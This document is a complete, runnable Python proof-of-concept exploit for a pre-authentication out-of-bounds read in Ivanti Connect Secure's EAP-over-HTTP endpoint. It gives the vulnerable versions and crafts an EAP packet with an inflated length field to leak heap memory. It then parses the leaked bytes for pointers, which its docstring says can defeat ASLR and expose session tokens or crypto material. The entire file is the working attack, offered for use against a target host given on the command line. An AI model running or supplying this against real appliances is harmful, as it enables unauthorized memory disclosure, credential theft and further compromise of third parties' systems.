#!/usr/bin/env python3
"""
Ivanti Connect Secure - EAP-over-HTTP Out-of-Bounds Read PoC

Target: web binary (22.7R2.3) - NO Canary, PIE enabled
Endpoint: /dana-na/auth/eap-o-http (PRE-AUTH)

Vulnerability:
  fcn.000d32d0 reads the EAP Length field (16-bit, big-endian at offset +2)
  and uses it as the size for memmove() without an upper bound check.
  The only validation is: cmp ax, 5 (length must be > 5).

  When EAP_Length > actual POST body size, memmove reads beyond the POST
  body buffer, leaking adjacent heap/stack memory.

  Fixed in 22.7R2.8: Added cmp edi, 0x1000 (4096-byte upper limit).

Impact:
  - Pre-auth information disclosure
  - Can leak heap pointers (ASLR bypass for 32-bit PIE)
  - Can leak session tokens or crypto material from heap

Prerequisite:
  - EAP/RADIUS authentication must be configured on the target
  - Target must be running 22.7R2.3 or earlier

Note: This is a PROOF OF CONCEPT for authorized security research.
"""

import struct
import sys
import ssl
import socket


def build_eap_packet(eap_code=2, eap_id=0, eap_type=1, eap_data=b"",
                     fake_length=None):
    """Build an EAP packet with optional fake length field."""
    real_length = 5 + len(eap_data)
    length = fake_length if fake_length is not None else real_length
    header = struct.pack(">BBHB", eap_code, eap_id, length, eap_type)
    return header + eap_data


def send_eap_over_http(host, port, eap_packet, timeout=10):
    """Send EAP packet via HTTP POST to the pre-auth endpoint."""
    path = "/dana-na/auth/eap-o-http"
    http_request = f"POST {path} HTTP/1.1\r\n"
    http_request += f"Host: {host}\r\n"
    http_request += f"Content-Type: application/eap\r\n"
    http_request += f"Content-Length: {len(eap_packet)}\r\n"
    http_request += f"Connection: close\r\n\r\n"

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    sock = ctx.wrap_socket(socket.socket(), server_hostname=host)
    sock.settimeout(timeout)

    try:
        sock.connect((host, port))
        sock.send(http_request.encode() + eap_packet)
        response = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break
        return response
    except Exception as e:
        return f"Error: {e}".encode()
    finally:
        sock.close()


def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <target_host> <target_port>")
        print(f"  Example: {sys.argv[0]} 192.168.1.1 443")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])

    print("=== Ivanti ICS EAP-over-HTTP OOB Read PoC ===")
    print(f"Target: {host}:{port}\n")

    # Step 1: Verify EAP endpoint
    print("[*] Testing EAP endpoint accessibility...")
    normal_eap = build_eap_packet(eap_code=2, eap_id=1, eap_type=1,
                                  eap_data=b"test_identity")
    resp = send_eap_over_http(host, port, normal_eap)
    if b"404" in resp[:100]:
        print("[-] EAP endpoint returned 404 - EAP/RADIUS not configured")
        sys.exit(1)
    elif b"200" in resp[:100] or b"EAP" in resp:
        print("[+] EAP endpoint is active!")
    else:
        print(f"[?] Response: {resp[:100].decode(errors='replace')}")

    # Step 2: Send EAP with inflated length (OOB read)
    print("\n[*] Sending EAP with inflated length (OOB read trigger)...")
    oob_eap = build_eap_packet(eap_code=2, eap_id=2, eap_type=1,
                               eap_data=b"A" * 32, fake_length=4096)
    resp = send_eap_over_http(host, port, oob_eap)

    # Step 3: Analyze response
    print("\n[*] Analyzing response for leaked data...")
    if len(resp) > 200:
        header_end = resp.find(b"\r\n\r\n")
        if header_end > 0:
            body = resp[header_end + 4:]
            print(f"[+] Response body: {len(body)} bytes")
            leaked_ptrs = []
            for i in range(0, len(body) - 4, 4):
                val = struct.unpack("<I", body[i:i+4])[0]
                if 0x08000000 <= val <= 0x0fffffff:
                    leaked_ptrs.append((i, val, "code/data"))
                elif 0xb7000000 <= val <= 0xbfffffff:
                    leaked_ptrs.append((i, val, "stack/libc"))
                elif 0xf7000000 <= val <= 0xf7ffffff:
                    leaked_ptrs.append((i, val, "libc"))
            if leaked_ptrs:
                print(f"[+] Found {len(leaked_ptrs)} potential leaked pointers!")
                for offset, ptr, ptype in leaked_ptrs[:20]:
                    print(f"    Offset {offset:4d}: 0x{ptr:08x} ({ptype})")
            else:
                print("[-] No obvious pointer leaks detected")
            print("\n[*] First 256 bytes of response body (hex):")
            for i in range(0, min(256, len(body)), 16):
                hex_part = " ".join(f"{b:02x}" for b in body[i:i+16])
                ascii_part = "".join(
                    chr(b) if 32 <= b < 127 else "." for b in body[i:i+16])
                print(f"    {i:04x}: {hex_part:<48s} {ascii_part}")
    else:
        print(f"[-] Short response ({len(resp)} bytes)")
        print(f"    {resp[:200].decode(errors='replace')}")

    print("\n[*] PoC complete.")
    print("[*] Leaked pointers can defeat ASLR for further exploitation")


if __name__ == "__main__":
    main()
